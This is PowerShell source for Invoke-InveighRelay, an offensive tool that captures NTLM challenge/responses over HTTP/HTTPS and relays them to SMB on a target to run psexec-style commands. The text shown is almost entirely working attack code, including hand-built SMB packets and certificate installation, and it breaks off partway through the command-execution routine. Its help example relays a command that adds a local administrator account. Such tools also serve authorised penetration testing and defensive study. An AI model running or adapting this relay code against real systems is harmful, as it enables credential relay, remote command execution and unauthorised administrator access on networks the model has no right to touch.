function Invoke-InveighRelay
{
<#
.SYNOPSIS
Invoke-InveighRelay performs NTLMv2 HTTP to SMB relay with psexec style command execution.

.DESCRIPTION
Invoke-InveighRelay currently supports NTLMv2 HTTP to SMB relay with psexec style command execution.

    HTTP/HTTPS to SMB NTLMv2 relay with granular control
    NTLMv1/NTLMv2 challenge/response capture over HTTP/HTTPS
    Granular control of console and file output
    Can be executed as either a standalone function or through Invoke-Inveigh

.PARAMETER HTTP
Default = Enabled: (Y/N) Enable/Disable HTTP challenge/response capture.

.PARAMETER HTTPS
Default = Disabled: (Y/N) Enable/Disable HTTPS challenge/response capture. Warning, a cert will be installed in
the local store and attached to port 443. If the script does not exit gracefully, execute
"netsh http delete sslcert ipport=0.0.0.0:443" and manually remove the certificate from "Local Computer\Personal"
in the cert store.

.PARAMETER HTTPSCertAppID
Valid application GUID for use with the ceriticate.

.PARAMETER HTTPSCertThumbprint
Certificate thumbprint for use with a custom certificate. The certificate filename must be located in the current
working directory and named Inveigh.pfx.

.PARAMETER Challenge
Default = Random: 16 character hex NTLM challenge for use with the HTTP listener. If left blank, a random
challenge will be generated for each request. Note that during SMB relay attempts, the challenge will be
pulled from the SMB relay target. 

.PARAMETER MachineAccounts
Default = Disabled: (Y/N) Enable/Disable showing NTLM challenge/response captures from machine accounts.

.PARAMETER WPADAuth
Default = NTLM: (Anonymous,NTLM) HTTP/HTTPS server authentication type for wpad.dat requests. Setting to
Anonymous can prevent browser login prompts.

.PARAMETER SMBRelayTarget
IP address of system to target for SMB relay.

.PARAMETER SMBRelayCommand
Command to execute on SMB relay target. Use PowerShell character escapes where necessary.

.PARAMETER SMBRelayUsernames
Default = All Usernames: Comma separated list of usernames to use for relay attacks. Accepts both username and
domain\username format. 

.PARAMETER SMBRelayAutoDisable
Default = Enable: (Y/N) Enable/Disable automaticaly disabling SMB relay after a successful command execution on
target.

.PARAMETER SMBRelayNetworkTimeout
Default = No Timeout: (Integer) Duration in seconds that Inveigh will wait for a reply from the SMB relay target
after each packet is sent.

.PARAMETER ConsoleOutput
Default = Disabled: (Y/N) Enable/Disable real time console output. If using this option through a shell, test to
ensure that it doesn't hang the shell.

.PARAMETER FileOutput
Default = Disabled: (Y/N) Enable/Disable real time file output.

.PARAMETER StatusOutput
Default = Enabled: (Y/N) Enable/Disable startup and shutdown messages.

.PARAMETER OutputStreamOnly
Default = Disabled: Enable/Disable forcing all output to the standard output stream. This can be helpful if
running Inveigh Relay through a shell that does not return other output streams. Note that you will not see the
various yellow warning messages if enabled.

.PARAMETER OutputDir
Default = Working Directory: Valid path to an output directory for log and capture files. FileOutput must also be
enabled.

.PARAMETER RunTime
(Integer) Run time duration in minutes.

.PARAMETER StartupChecks
Default = Enabled: (Y/N) Enable/Disable checks for in use ports and running services on startup.

.PARAMETER ShowHelp
Default = Enabled: (Y/N) Enable/Disable the help messages at startup.

.PARAMETER Tool
Default = 0: (0,1,2) Enable/Disable features for better operation through external tools such as Meterpreter's
PowerShell extension, Metasploit's Interactive PowerShell Sessions payloads and Empire.
0 = None, 1 = Metasploit/Meterpreter, 2 = Empire 

.EXAMPLE
Invoke-Inveigh -HTTP N
Invoke-InveighRelay -SMBRelayTarget 192.168.2.55 -SMBRelayCommand "net user Dave Summer2016 /add && net localgroup administrators Dave /add"
Perform SMB relay with a command that will create a local administrator account on the SMB relay
target.

.LINK
https://github.com/Kevin-Robertson/Inveigh
#>

# Parameter default values can be modified in this section:
[CmdletBinding()]
param
( 
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTP = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTPS = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ConsoleOutput = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$FileOutput = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$StatusOutput = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$OutputStreamOnly = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$MachineAccounts = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ShowHelp = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$SMBRelayAutoDisable = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$StartupChecks = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Anonymous","NTLM")][String]$WPADAuth = "NTLM",
    [parameter(Mandatory=$false)][ValidateSet("0","1","2")][String]$Tool = "0",
    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$OutputDir = "",
    [parameter(Mandatory=$true)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$SMBRelayTarget = "",
    [parameter(Mandatory=$false)][ValidatePattern('^[A-Fa-f0-9]{16}$')][String]$Challenge = "",
    [parameter(Mandatory=$false)][Array]$SMBRelayUsernames = "",
    [parameter(Mandatory=$false)][Int]$SMBRelayNetworkTimeout = "",
    [parameter(Mandatory=$false)][Int]$RunTime = "",
    [parameter(Mandatory=$true)][String]$SMBRelayCommand = "",
    [parameter(Mandatory=$false)][String]$HTTPSCertAppID = "00112233-4455-6677-8899-AABBCCDDEEFF",
    [parameter(Mandatory=$false)][String]$HTTPSCertThumbprint = "98c1d54840c5c12ced710758b6ee56cc62fa1f0d",
    [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
)

if ($invalid_parameter)
{
    throw "$($invalid_parameter) is not a valid parameter."
}

if($inveigh.HTTP -or $inveigh.HTTPS)
{
    throw "You must stop stop other Inveigh HTTP/HTTPS listeners before running this module."
}

if(!$SMBRelayTarget)
{
    throw "You must specify an -SMBRelayTarget if enabling -SMBRelay"
}

if(!$SMBRelayCommand)
{
    throw "You must specify an -SMBRelayCommand if enabling -SMBRelay"
}

if(!$OutputDir)
{ 
    $output_directory = $PWD.Path
}
else
{
    $output_directory = $OutputDir
}

if(!$inveigh)
{
    $global:inveigh = [HashTable]::Synchronized(@{})
    $inveigh.log = New-Object System.Collections.ArrayList
    $inveigh.NTLMv1_list = New-Object System.Collections.ArrayList
    $inveigh.NTLMv1_username_list = New-Object System.Collections.ArrayList
    $inveigh.NTLMv2_list = New-Object System.Collections.ArrayList
    $inveigh.NTLMv2_username_list = New-Object System.Collections.ArrayList
    $inveigh.cleartext_list = New-Object System.Collections.ArrayList
    $inveigh.IP_capture_list = New-Object System.Collections.ArrayList
    $inveigh.SMBRelay_failed_list = New-Object System.Collections.ArrayList
    $inveigh.valid_host_list = New-Object System.Collections.ArrayList
}

if($inveigh.HTTP_listener.IsListening -and !$inveigh.running)
{
    $inveigh.HTTP_listener.Stop()
    $inveigh.HTTP_listener.Close()
}

if(!$inveigh.running -or !$inveigh.unprivileged_running)
{
    $inveigh.console_queue = New-Object System.Collections.ArrayList
    $inveigh.status_queue = New-Object System.Collections.ArrayList
    $inveigh.log_file_queue = New-Object System.Collections.ArrayList
    $inveigh.NTLMv1_file_queue = New-Object System.Collections.ArrayList
    $inveigh.NTLMv2_file_queue = New-Object System.Collections.ArrayList
    $inveigh.cleartext_file_queue = New-Object System.Collections.ArrayList
    $inveigh.HTTP_challenge_queue = New-Object System.Collections.ArrayList
    $inveigh.certificate_application_ID = $HTTPSCertAppID
    $inveigh.certificate_thumbprint = $HTTPSCertThumbprint
    $inveigh.console_output = $false
    $inveigh.console_input = $true
    $inveigh.file_output = $false
    $inveigh.log_out_file = $output_directory + "\Inveigh-Log.txt"
    $inveigh.NTLMv1_out_file = $output_directory + "\Inveigh-NTLMv1.txt"
    $inveigh.NTLMv2_out_file = $output_directory + "\Inveigh-NTLMv2.txt"
    $inveigh.cleartext_out_file = $output_directory + "\Inveigh-Cleartext.txt"
}

$inveigh.relay_running = $true
$inveigh.SMB_relay_active_step = 0
$inveigh.SMB_relay = $true

if($StatusOutput -eq 'Y')
{
    $inveigh.status_output = $true
}
else
{
    $inveigh.status_output = $false
}

if($OutputStreamOnly -eq 'Y')
{
    $inveigh.output_stream_only = $true
}
else
{
    $inveigh.output_stream_only = $false
}

if($Tool -eq 1) # Metasploit Interactive PowerShell Payloads and Meterpreter's PowerShell Extension
{
    $inveigh.tool = 1
    $inveigh.output_stream_only = $true
    $inveigh.newline = ""
    $ConsoleOutput = "N"
}
elseif($Tool -eq 2) # PowerShell Empire
{
    $inveigh.tool = 2
    $inveigh.output_stream_only = $true
    $inveigh.console_input = $false
    $inveigh.newline = "`n"
    $ConsoleOutput = "Y"
    $ShowHelp = "N"
}
else
{
    $inveigh.tool = 0
    $inveigh.newline = ""
}

# Write startup messages
$inveigh.status_queue.Add("Inveigh Relay started at $(Get-Date -format 's')") > $null
$inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Inveigh Relay started")]) > $null

if($StartupChecks -eq 'Y')
{
    $firewall_status = netsh advfirewall show allprofiles state | Where-Object {$_ -match 'ON'}
}

if($firewall_status)
{
    $inveigh.status_queue.Add("Windows Firewall = Enabled")  > $null

    $firewall_rules = New-Object -comObject HNetCfg.FwPolicy2
    $firewall_powershell = $firewall_rules.rules | Where-Object {$_.Enabled -eq $true -and $_.Direction -eq 1} |Select-Object -Property Name | Select-String "Windows PowerShell}"

    if($firewall_powershell)
    {
        $inveigh.status_queue.Add("Windows Firewall - PowerShell.exe = Allowed")  > $null
    }
}

if($HTTP -eq 'Y')
{

    if($StartupChecks -eq 'Y')
    {
        $HTTP_port_check = netstat -anp TCP | findstr LISTENING | findstr /C:":80 "
    }

    if($HTTP_port_check)
    {
        $inveigh.HTTP = $false
        $inveigh.status_queue.Add("HTTP Capture/Relay Disabled Due To In Use Port 80")  > $null
    }
    else
    {
        $inveigh.HTTP = $true
        $inveigh.status_queue.Add("HTTP Capture/Relay = Enabled")  > $null
    }

}
else
{
    $inveigh.HTTP = $false
    $inveigh.status_queue.Add("HTTP Capture/Relay = Disabled")  > $null
}

if($HTTPS -eq 'Y')
{
    
    if($StartupChecks -eq 'Y')
    {
        $HTTPS_port_check = netstat -anp TCP | findstr LISTENING | findstr /C:":443 "
    }

    if($HTTPS_port_check)
    {
        $inveigh.HTTPS = $false
        $inveigh.status_queue.Add("HTTPS Capture/Relay Disabled Due To In Use Port 443")  > $null
    }
    else
    {

        try
        {
            $inveigh.HTTPS = $true
            $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
            $certificate_store.Open('ReadWrite')
            $certificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2
            $certificate.Import($PWD.Path + "\Inveigh.pfx")
            $certificate_store.Add($certificate) 
            $certificate_store.Close()
            $netsh_certhash = "certhash=" + $inveigh.certificate_thumbprint
            $netsh_app_ID = "appid={" + $inveigh.certificate_application_ID + "}"
            $netsh_arguments = @("http","add","sslcert","ipport=0.0.0.0:443",$netsh_certhash,$netsh_app_ID)
            & "netsh" $netsh_arguments > $null
            $inveigh.status_queue.Add("HTTPS Capture/Relay = Enabled")  > $null
        }
        catch
        {
            $certificate_store.Close()
            $HTTPS="N"
            $inveigh.HTTPS = $false
            $inveigh.status_queue.Add("HTTPS Capture/Relay Disabled Due To Certificate Install Error")  > $null
        }

    }

}
else
{
    $inveigh.status_queue.Add("HTTPS Capture/Relay = Disabled")  > $null
}

if($inveigh.HTTP -or $inveigh.HTTPS)
{

    if($Challenge)
    {
        $inveigh.status_queue.Add("NTLM Challenge = $Challenge")  > $null
    }

    if($MachineAccounts -eq 'N')
    {
        $inveigh.status_queue.Add("Machine Account Capture = Disabled") > $null
        $inveigh.machine_accounts = $false
    }
    else
    {
        $inveigh.machine_accounts = $true
    }

    $inveigh.status_queue.Add("WPAD Authentication = $WPADAuth") > $null

}

$inveigh.status_queue.Add("SMB Relay Target = $SMBRelayTarget") > $null

if($SMBRelayUsernames)
{

    if($SMBRelayUsernames.Count -eq 1)
    {
        $inveigh.status_queue.Add("SMB Relay Username = " + ($SMBRelayUsernames -join ",")) > $null
    }
    else
    {
        $inveigh.status_queue.Add("SMB Relay Usernames = " + ($SMBRelayUsernames -join ",")) > $null
    }

}

if($SMBRelayAutoDisable -eq 'Y')
{
    $inveigh.status_queue.Add("SMB Relay Auto Disable = Enabled") > $null
}
else
{
    $inveigh.status_queue.Add("SMB Relay Auto Disable = Disabled") > $null
}

if($SMBRelayNetworkTimeout)
{
    $inveigh.status_queue.Add("SMB Relay Network Timeout = $SMBRelayNetworkTimeout Seconds") > $null
}

if($ConsoleOutput -eq 'Y')
{
    $inveigh.status_queue.Add("Real Time Console Output = Enabled") > $null
    $inveigh.console_output = $true
}
else
{

    if($inveigh.tool -eq 1)
    {
        $inveigh.status_queue.Add("Real Time Console Output Disabled Due To External Tool Selection") > $null
    }
    else
    {
        $inveigh.status_queue.Add("Real Time Console Output = Disabled") > $null
    }

}

if($FileOutput -eq 'Y')
{

    if($inveigh.file_output)
    {
        $inveigh.file_output = $false      
    }
    else
    {
        $inveigh.file_output = $true
    }

    $inveigh.status_queue.Add("Real Time File Output = Enabled") > $null
    $inveigh.status_queue.Add("Output Directory = $output_directory") > $null
    $inveigh.file_output = $true

}
else
{
    $inveigh.status_queue.Add("Real Time File Output = Disabled") > $null
}

if($RunTime -eq 1)
{
    $inveigh.status_queue.Add("Run Time = $RunTime Minute") > $null
}
elseif($RunTime -gt 1)
{
    $inveigh.status_queue.Add("Run Time = $RunTime Minutes") > $null
}

if($ShowHelp -eq 'Y')
{
    $inveigh.status_queue.Add("Run Stop-Inveigh to stop Inveigh-Relay") > $null
        
    if($inveigh.console_output)
    {
        $inveigh.status_queue.Add("Press any key to stop real time console output") > $null
    }

}

if($inveigh.status_output)
{

    while($inveigh.status_queue.Count -gt 0)
    {

        if($inveigh.output_stream_only)
        {
            Write-Output($inveigh.status_queue[0] + $inveigh.newline)
            $inveigh.status_queue.RemoveAt(0)
        }
        else
        {

            switch -Wildcard ($inveigh.status_queue[0])
            {

                "* Disabled Due To *"
                {
                    Write-Warning($inveigh.status_queue[0])
                    $inveigh.status_queue.RemoveAt(0)
                }
                
                "Run Stop-Inveigh to stop Inveigh-Relay"
                {
                    Write-Warning($inveigh.status_queue[0])
                    $inveigh.status_queue.RemoveAt(0)
                }

                "Windows Firewall = Enabled"
                {
                    Write-Warning($inveigh.status_queue[0])
                    $inveigh.status_queue.RemoveAt(0)
                }

                default
                {
                    Write-Output($inveigh.status_queue[0])
                    $inveigh.status_queue.RemoveAt(0)
                }

            }

        }

    }

}

$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
$process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
$process_ID = $process_ID -replace "-00-00",""
[Byte[]]$inveigh.process_ID_bytes = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

# Begin ScriptBlocks

# Shared Basic functions ScriptBlock
$shared_basic_functions_scriptblock =
{

    function DataLength2
    {
        param ([Int]$length_start,[Byte[]]$string_extract_data)

        $string_length = [System.BitConverter]::ToUInt16($string_extract_data[$length_start..($length_start + 1)],0)
        return $string_length
    }

    function DataLength4
    {
        param ([Int]$length_start,[Byte[]]$string_extract_data)

        $string_length = [System.BitConverter]::ToUInt32($string_extract_data[$length_start..($length_start + 3)],0)
        return $string_length
    }

    function DataToString
    {
        param ([Int]$string_start,[Int]$string_length,[Byte[]]$string_extract_data)

        $string_data = [System.BitConverter]::ToString($string_extract_data[$string_start..($string_start + $string_length - 1)])
        $string_data = $string_data -replace "-00",""
        $string_data = $string_data.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $string_extract = New-Object System.String ($string_data,0,$string_data.Length)
        return $string_extract
    }

}

# SMB NTLM functions ScriptBlock - function for parsing NTLM challenge/response
$SMB_NTLM_functions_scriptblock =
{
    function SMBNTLMChallenge
    {
        param ([Byte[]]$payload_bytes)

        $payload = [System.BitConverter]::ToString($payload_bytes)
        $payload = $payload -replace "-",""
        $NTLM_index = $payload.IndexOf("4E544C4D53535000")

        if($payload.SubString(($NTLM_index + 16),8) -eq "02000000")
        {
            $NTLM_challenge = $payload.SubString(($NTLM_index + 48),16)
        }

        return $NTLM_challenge
    }

}

# SMB Relay Challenge ScriptBlock - gathers NTLM server challenge from relay target
$SMB_relay_challenge_scriptblock =
{
    function SMBRelayChallenge
    {
        param ($SMB_relay_socket,$HTTP_request_bytes)

        if ($SMB_relay_socket)
        {
            $SMB_relay_challenge_stream = $SMB_relay_socket.GetStream()
        }
        
        $SMB_relay_challenge_bytes = New-Object System.Byte[] 1024
        $i = 0
        
        :SMB_relay_challenge_loop while ($i -lt 2)
        {
        
            switch ($i)
            {

                0
                {
                    $SMB_relay_challenge_send = 0x00,0x00,0x00,0x2f,0xff,0x53,0x4d,0x42,0x72,0x00,0x00,0x00,0x00,
                                                0x18,0x01,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0xff,0xff +
                                                $inveigh.process_ID_bytes +
                                                0x00,0x00,0x00,0x00,0x00,0x0c,0x00,0x02,0x4e,0x54,0x20,0x4c,0x4d,
                                                0x20,0x30,0x2e,0x31,0x32,0x00
                }
                
                1
                { 
                    $SMB_length_1 = '0x{0:X2}' -f ($HTTP_request_bytes.Length + 32)
                    $SMB_length_2 = '0x{0:X2}' -f ($HTTP_request_bytes.Length + 22)
                    $SMB_length_3 = '0x{0:X2}' -f ($HTTP_request_bytes.Length + 2)
                    $SMB_NTLMSSP_length = '0x{0:X2}' -f ($HTTP_request_bytes.Length)
                    $SMB_blob_length = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($HTTP_request_bytes.Length + 34))
                    $SMB_blob_length = $SMB_blob_length -replace "-00-00",""
                    $SMB_blob_length = $SMB_blob_length.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                    $SMB_byte_count = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($HTTP_request_bytes.Length + 45))
                    $SMB_byte_count = $SMB_byte_count -replace "-00-00",""
                    $SMB_byte_count = $SMB_byte_count.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                    $SMB_netbios_length = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($HTTP_request_bytes.Length + 104))
                    $SMB_netbios_length = $SMB_netbios_length -replace "-00-00",""
                    $SMB_netbios_length = $SMB_netbios_length.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                    [Array]::Reverse($SMB_netbios_length)
                    
                    $SMB_relay_challenge_send = 0x00,0x00 +
                                                $SMB_netbios_length +
                                                0xff,0x53,0x4d,0x42,0x73,0x00,0x00,0x00,0x00,0x18,0x01,0x48,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff +
                                                $inveigh.process_ID_bytes +
                                                0x00,0x00,0x00,0x00,0x0c,0xff,0x00,0x00,0x00,0xff,0xff,0x02,0x00,
                                                0x01,0x00,0x00,0x00,0x00,0x00 +
                                                $SMB_blob_length +
                                                0x00,0x00,0x00,0x00,0x44,0x00,0x00,0x80 +
                                                $SMB_byte_count +
                                                0x60 +
                                                $SMB_length_1 +
                                                0x06,0x06,0x2b,0x06,0x01,0x05,0x05,0x02,0xa0 +
                                                $SMB_length_2 +
                                                0x30,0x3c,0xa0,0x0e,0x30,0x0c,0x06,0x0a,0x2b,0x06,0x01,0x04,0x01,
                                                0x82,0x37,0x02,0x02,0x0a,0xa2 +
                                                $SMB_length_3 +
                                                0x04 +
                                                $SMB_NTLMSSP_length +
                                                $HTTP_request_bytes +
                                                0x55,0x6e,0x69,0x78,0x00,0x53,0x61,0x6d,0x62,0x61,0x00
                }
            
            }

            $SMB_relay_challenge_stream.Write($SMB_relay_challenge_send,0,$SMB_relay_challenge_send.Length)
            $SMB_relay_challenge_stream.Flush()
            
            if($SMBRelayNetworkTimeout)
            {
                $SMB_relay_challenge_timeout = New-TimeSpan -Seconds $SMBRelayNetworkTimeout
                $SMB_relay_challenge_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
                
                while(!$SMB_relay_challenge_stream.DataAvailable)
                {

                    if($SMB_relay_challenge_stopwatch.Elapsed -ge $SMB_relay_challenge_timeout)
                    {
                        $inveigh.console_queue.Add("SMB relay target didn't respond within $SMBRelayNetworkTimeout seconds")
                        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay target didn't respond within $SMBRelayNetworkTimeout seconds")])
                        $inveigh.SMB_relay_active_step = 0
                        $SMB_relay_socket.Close()
                        break SMB_relay_challenge_loop
                    }
                
                }
            
            }
    
            $SMB_relay_challenge_stream.Read($SMB_relay_challenge_bytes,0,$SMB_relay_challenge_bytes.Length)
            $i++
        }
        
        return $SMB_relay_challenge_bytes
    }

}

# SMB Relay Response ScriptBlock - sends NTLM reponse to relay target
$SMB_relay_response_scriptblock =
{
    function SMBRelayResponse
    {
        param ($SMB_relay_socket,$HTTP_request_bytes,$SMB_user_ID)
    
        $SMB_relay_response_bytes = New-Object System.Byte[] 1024

        if ($SMB_relay_socket)
        {
            $SMB_relay_response_stream = $SMB_relay_socket.GetStream()
        }

        $SMB_length_1 = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($HTTP_request_bytes.Length + 12))
        $SMB_length_1 = $SMB_length_1 -replace "-00-00",""
        $SMB_length_1 = $SMB_length_1.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $SMB_length_2 = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($HTTP_request_bytes.Length + 8))
        $SMB_length_2 = $SMB_length_2 -replace "-00-00",""
        $SMB_length_2 = $SMB_length_2.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $SMB_length_3 = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($HTTP_request_bytes.Length + 4))
        $SMB_length_3 = $SMB_length_3 -replace "-00-00",""
        $SMB_length_3 = $SMB_length_3.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $SMB_NTLMSSP_length = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($HTTP_request_bytes.Length))
        $SMB_NTLMSSP_length = $SMB_NTLMSSP_length -replace "-00-00",""
        $SMB_NTLMSSP_length = $SMB_NTLMSSP_length.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $SMB_blob_length = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($HTTP_request_bytes.Length + 16))
        $SMB_blob_length = $SMB_blob_length -replace "-00-00",""
        $SMB_blob_length = $SMB_blob_length.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $SMB_byte_count = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($HTTP_request_bytes.Length + 27))
        $SMB_byte_count = $SMB_byte_count -replace "-00-00",""
        $SMB_byte_count = $SMB_byte_count.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $SMB_netbios_length = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($HTTP_request_bytes.Length + 86))
        $SMB_netbios_length = $SMB_netbios_length -replace "-00-00",""
        $SMB_netbios_length = $SMB_netbios_length.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        [Array]::Reverse($SMB_length_1)
        [Array]::Reverse($SMB_length_2)
        [Array]::Reverse($SMB_length_3)
        [Array]::Reverse($SMB_NTLMSSP_length)
        [Array]::Reverse($SMB_netbios_length)
        $j = 0
        
        :SMB_relay_response_loop while ($j -lt 1)
        {
            $SMB_relay_response_send = 0x00,0x00 +
                                        $SMB_netbios_length +
                                        0xff,0x53,0x4d,0x42,0x73,0x00,0x00,0x00,0x00,0x18,0x01,0x48,0x00,0x00,0x00,
                                        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff +
                                        $inveigh.process_ID_bytes +
                                        $SMB_user_ID +
                                        0x00,0x00,0x0c,0xff,0x00,0x00,0x00,0xff,0xff,0x02,0x00,0x01,0x00,0x00,0x00,
                                        0x00,0x00 +
                                        $SMB_blob_length +
                                        0x00,0x00,0x00,0x00,0x44,0x00,0x00,0x80 +
                                        $SMB_byte_count +
                                        0xa1,0x82 +
                                        $SMB_length_1 +
                                        0x30,0x82 +
                                        $SMB_length_2 +
                                        0xa2,0x82 +
                                        $SMB_length_3 +
                                        0x04,0x82 +
                                        $SMB_NTLMSSP_length +
                                        $HTTP_request_bytes +
                                        0x55,0x6e,0x69,0x78,0x00,0x53,0x61,0x6d,0x62,0x61,0x00

            $SMB_relay_response_stream.Write($SMB_relay_response_send,0,$SMB_relay_response_send.Length)
        	$SMB_relay_response_stream.Flush()
            
            if($SMBRelayNetworkTimeout)
            {
                $SMB_relay_response_timeout = New-TimeSpan -Seconds $SMBRelayNetworkTimeout
                $SMB_relay_response_stopwatch = [Sustem.Diagnostics.Stopwatch]::StartNew()
                    
                while(!$SMB_relay_response_stream.DataAvailable)
                {

                    if($SMB_relay_response_stopwatch.Elapsed -ge $SMB_relay_response_timeout)
                    {
                        $inveigh.console_queue.Add("SMB relay target didn't respond within $SMBRelayNetworkTimeout seconds")
                        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay target didn't respond within $SMBRelayNetworkTimeout seconds")])
                        $inveigh.SMB_relay_active_step = 0
                        $SMB_relay_socket.Close()
                        break :SMB_relay_response_loop
                    }

                }

            }

            $SMB_relay_response_stream.Read($SMB_relay_response_bytes,0,$SMB_relay_response_bytes.Length)
            $inveigh.SMB_relay_active_step = 2
            $j++
        }

        return $SMB_relay_response_bytes
    }

}

# SMB Relay Execute ScriptBlock - executes command within authenticated SMB session
$SMB_relay_execute_scriptblock =
{
    function SMBRelayExecute
    {
        param ($SMB_relay_socket,$SMB_user_ID)
    
        if ($SMB_relay_socket)
        {
            $SMB_relay_execute_stream = $SMB_relay_socket.GetStream()
        }

        $SMB_relay_failed = $false
        $SMB_relay_execute_bytes = New-Object System.Byte[] 1024
        $SMB_service_random = [String]::Join("00-",(1..20 | ForEach-Object{"{0:X2}-" -f (Get-Random -Minimum 65 -Maximum 90)}))
        $SMB_service = $SMB_service_random -replace "-00",""
        $SMB_service = $SMB_service.Substring(0,$SMB_service.Length - 1)
        $SMB_service = $SMB_service.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $SMB_service = New-Object System.String ($SMB_service,0,$SMB_service.Length)
        $SMB_service_random += '00-00-00'
        [Byte[]] $SMB_service_bytes = $SMB_service_random.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $SMB_referent_ID_bytes = [String](1..4 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        $SMB_referent_ID_bytes = $SMB_referent_ID_bytes.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $SMBRelayCommand = "%COMSPEC% /C `"" + $SMBRelayCommand + "`""
        [System.Text.Encoding]::UTF8.GetBytes($SMBRelayCommand) | ForEach-Object{$SMB_relay_command += "{0:X2}-00-" -f $_}

        if([Bool]($SMBRelayCommand.Length % 2))
        {
            $SMB_relay_command += '00-00'
        }
        else
        {
            $SMB_relay_command += '00-00-00-00'
        }    
        
        [Byte[]] $SMB_relay_command_bytes = $SMB_relay_command.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $SMB_service_data_length_bytes = [System.BitConverter]::GetBytes($SMB_relay_command_bytes.Length + $SMB_service_bytes.Length + 237)
        $SMB_service_data_length_bytes = $SMB_service_data_length_bytes[2..0]
        $SMB_service_byte_count_bytes = [System.BitConverter]::GetBytes($SMB_relay_command_bytes.Length + $SMB_service_bytes.Length + 174)
        $SMB_service_byte_count_bytes = $SMB_service_byte_count_bytes[0..1]   
        $SMB_relay_command_length_bytes = [System.BitConverter]::GetBytes($SMB_relay_command_bytes.Length / 2)
        $k = 0

        :SMB_relay_execute_loop while ($k -lt 12)
        {

            switch ($k)
            {
            
                0
                {
                    $SMB_relay_execute_send = 0x00,0x00,0x00,0x45,0xff,0x53,0x4d,0x42,0x75,0x00,0x00,0x00,0x00,
                                                0x18,0x01,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0xff,0xff +
                                                $inveigh.process_ID_bytes +
                                                $SMB_user_ID +
                                                0x00,0x00,0x04,0xff,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x1a,0x00,
                                                0x00,0x5c,0x5c,0x31,0x30,0x2e,0x31,0x30,0x2e,0x32,0x2e,0x31,0x30,
                                                0x32,0x5c,0x49,0x50,0x43,0x24,0x00,0x3f,0x3f,0x3f,0x3f,0x3f,0x00
                }
                  
                1
                {
                    $SMB_relay_execute_send = 0x00,0x00,0x00,0x5b,0xff,0x53,0x4d,0x42,0xa2,0x00,0x00,0x00,0x00,
                                                0x18,0x02,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x08 +
                                                $inveigh.process_ID_bytes +
                                                $SMB_user_ID +
                                                0x03,0x00,0x18,0xff,0x00,0x00,0x00,0x00,0x07,0x00,0x16,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x01,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x08,
                                                0x00,0x5c,0x73,0x76,0x63,0x63,0x74,0x6c,0x00
                }
                
                2
                {
